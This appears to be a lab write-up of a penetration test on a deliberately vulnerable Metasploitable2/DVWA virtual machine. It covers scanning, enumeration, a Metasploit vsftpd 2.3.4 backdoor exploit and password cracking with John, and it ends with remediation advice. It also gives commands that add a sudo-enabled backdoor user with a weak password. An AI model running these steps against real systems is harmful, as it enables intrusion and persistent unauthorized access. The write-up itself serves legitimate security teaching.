# 🛡️ Penetration Testing and Remediation on a Target System

# 🎯 OBJECTIVES -
To conduct a structured penetration test using ethical hacking techniques on a deliberately vulnerable virtual machine. The objective is to simulate a real-world attack scenario and then provide recommendations for remediation.

# 💻 LAB ENVIRONMENT -
|Component         |  Details                             |
|------------------|--------------------------------------|
|Attacker Machine  |  Kali Linux (Latest Version)         |
|Target Machine    |  Metasploitable2 / DVWA              |
|Network Type      |  Host-Only or NAT (VMware/VirtualBox)|
|Target IP         |  192.168.56.101 (example)            |

# 🚀 TASK PERFORMED –
# 🔍 Task 1: Basic Network Scanning
Purpose: Identify open and potentially vulnerable ports and services.
Command:
nmap -sS -sV -T4 -Pn 192.168.56.101
Expected Output:
|PORT   | STATE | SERVICE | VERSION                                     |
|-------|-------|---------|---------------------------------------------|
|21/tcp | open  | ftp     | vsftpd 2.3.4                                |
|22/tcp | open  | ssh     | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)|
Open Services Analysis:
FTP (21): Unauthenticated access or vulnerable versions.
SSH (22): Brute-force potential.

# 🕵️‍♀️ Task 2: Reconnaissance
Purpose: To identify web-based vulnerabilities and sensitive files.
Command:
nikto -h http://192.168.56.101
Expected Output:
+ Server: Apache/2.2.8 (Ubuntu)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
# 🔐 Hidden Services Example:
phpinfo.php: Often left during development.
/test/ or /backup/ folders may contain credentials or outdated code.
# 🛠️ Extra Tool:
dirb http://192.168.56.101

# 📝 Task 3: Enumeration Summary
Purpose: To gather detailed information about services, users, and shares.
Command (Samba Enumeration):
enum4linux -a 192.168.56.101
Expected Output:
Users: admin, user1, guest
Shares: IPC$, ADMIN$, Public, tmp
Machine Name: METASPLOITABLE

# 💥Task 4: Exploitation of Services
Exploit Example: vsftpd 2.3.4 Backdoor
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
Expected Output:
Backdoor service has been spawned.
Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.101:6200)

# 👤 Task 5: Creating A Privileged User
Command inside Shell:
useradd -m hacker
echo 'hacker:hacked123' | chpasswd
usermod -aG sudo hacker
Expected Output:
uid=1001(hacker) gid=1001(hacker) groups=1001(hacker),27(sudo)

# 🥷 Task 6: Cracking Password Hash
Command:

Crack Using John:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Expected Output:

hacked123 (hacker)

# 🔧 Task 7: Remediation And Recommendations
|Issue                              | Risk                      | Recommendation                         |
|-----------------------------------|---------------------------|----------------------------------------|
|vsftpd 2.3.4 with backdoor         | Remote shell access       | Disable FTP or update to latest version|
|Web server exposes /phpinfo.php    | Sensitive info disclosure | Remove or restrict access              |
|Default users found via enum4linux | Easy brute-force          | Remove or rename default account       |
|Weak password found                | Easy to crack             | Use strong, complex passwords          |

# 📚 Conclusion
This project demonstrated a typical penetration testing workflow including scanning, enumeration, exploitation, and remediation planning. The vulnerabilities identified are common in many legacy or misconfigured systems and serve as practical learning examples for both aspiring ethical hackers and defenders.

# ⚠️ Disclaimer
This project is strictly for educational purposes. All activities were conducted in a closed virtual environment with no access to external or live systems.
